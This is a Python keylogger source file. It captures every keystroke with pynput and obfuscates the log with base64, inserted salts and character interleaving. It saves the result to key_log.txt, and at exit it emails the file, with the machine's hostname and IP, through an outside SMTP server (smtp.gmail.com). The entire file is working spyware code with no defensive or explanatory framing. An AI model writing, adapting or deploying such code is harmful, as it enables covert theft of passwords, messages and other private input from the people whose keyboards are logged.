from pynput.keyboard import Key, Listener
from base64 import b64encode as b64
from itertools import chain
from Mail import MailSender
from datetime import datetime
import logging
import atexit
import socket

log_dir = ""
keyStrokes = []

logging.basicConfig(filename=(log_dir + "key_log.txt"),
                    level=logging.DEBUG, format='%(message)s')


def Encode(string):
    string = b64(string.encode())
    return string.decode('utf-8')


def addSalts(string):
    salts = ["@@PoC", "ˆaDnIL(", "nSo@rsa2h"]
    size = len(string)
    for s in salts:
        string = string[0:int(size / 2)] + s + string[int(size / 2):size]
    return salts[0] + string + salts[2] + salts[1]


def Encrypt(string):
    string = Encode(string)
    string = addSalts(string)
    string = zip(string, string[::-1])
    string = chain(*string)
    string = list(string)
    return Encode("".join(string))


def WriteFile():
    global keyStrokes
    logging.info(Encrypt("".join(keyStrokes)))
    keyStrokes = []
    return


def send_email():
    sub = socket.gethostname() + " - IP: "
    + socket.gethostbyname(socket.gethostname())

    mail = MailSender("",
                      "",
                      "",
                      "smtp.gmail.com:857",
                      "key_log.txt",
                      sub,
                      str(datetime.now())
                      )
    mail.send_email()
    return


def exit_handler():
    WriteFile()
    send_email()


atexit.register(exit_handler)


def on_press(key):
    global keyStrokes
    keyStrokes.append(str(key))


with Listener(on_press=on_press) as listener:
    listener.join()
